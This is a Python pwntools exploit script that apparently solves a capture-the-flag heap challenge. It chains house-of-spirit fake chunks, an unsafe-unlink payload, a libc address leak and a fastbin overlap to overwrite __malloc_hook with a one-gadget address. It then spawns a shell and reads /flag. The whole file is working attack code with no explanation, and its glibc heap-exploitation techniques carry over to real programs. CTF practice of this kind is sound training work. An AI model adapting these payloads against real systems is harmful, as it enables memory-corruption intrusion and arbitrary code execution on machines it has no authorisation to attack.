#!python
#-*- coding: utf-8 -*-
from pwn import *

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop = True)
s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y: p.sendlineafter(x,y)

context.log_level = 'debug'
context.terminal = ['tmux','sp','-h','-l','120']

# p = remote('127.0.0.1',8888)
p = process('./pwn')
elf = ELF("./pwn")
libc = elf.libc

def add(size,cnt):
    sl(">> ",str(1))
    sl("size\n",str(size))
    s("content\n",cnt)

def add_no_output(size,cnt):
    p.sendline(str(1))
    p.send(str(size).ljust(0x8,'\x00'))
    p.send(cnt)

def dele():
    sl(">> ",str(2))

def dele_no_output():
    p.sendline(str(2))

def show():
    sl(">> ",str(3))

def gift(choice,cnt=""):
    sl(">> ",str(666))
    s("free?",str(choice))
    if choice==1:
        s("content\n",cnt)

# house of spirit
s("username:",3*p64(0)+p64(0x41))
s("info",3*p64(0)+p64(0x20e21))

add(0x38,'\0'*0x38)
dele()
add(0x48,'\0'*0x48)
dele()
add(0x28,'\0'*0x28)
dele()
add(0x18,'\0'*0x18)
dele()
add(0x68,'\0'*0x30+p64(0)+p64(0x21)+"\0"*0x10+p64(0x20)+p64(0x101))
dele()

add(0x80,'\x00'*0x80)
add(0x28,'\0'*0x28)
dele()

sl(">> ",'1'*0x400)

payload = 2*p64(0)
payload += p64(0x602098-0x18)+p64(0x602098-0x10)
payload = payload.ljust(0x80,'\0')
payload += p64(0x80)+p64(0x90)

gift(1,cnt=payload)
dele()
gift(2)

# Leaking libc
add(0x38,p64(0)+p64(0x602080)+p64(0xdeadbeefdeadbeef))
dele()
add(0x68,'A'*0x10)
# gdb.attach(p)#'b *0x400A47\n b *'+hex(one))
show()
ru("A"*0x10)

libc.address= u64(ru("\n").ljust(0x8,'\x00'))-0x3c4b78
log.info("libc.address:"+hex(libc.address))
__malloc_hook = libc.sym['__malloc_hook']
system = libc.sym['system']

#one = libc.address+0xf1147
# one = libc.address+0x4526a
one = libc.address+0xf02a4
# one = libc.address+0xf1147
# one = libc.address+0x45216
log.info("one:"+hex(one))

# Overlap
#dele()
#add(0x80,'\x00'*0x80)
#add(0x18,p64(0)+p64(0x71)+p64(__malloc_hook-0x23))
#add(0x68,'\x00'*0x68)
#add(0x68,'\x00'*0x13+p64(one))
#dele()

# gdb.attach(p)
dele_no_output()
add_no_output(0x80,'\0'*0x80)
add_no_output(0x18,p64(0)+p64(0x71)+p64(__malloc_hook-0x23))
add_no_output(0x68,'\0'*0x68)
add_no_output(0x68,"\0"*0x13+p64(one)+'\n')

# getshell
p.sendline("2")
p.sendline("cat /flag >&0")

p.interactive()
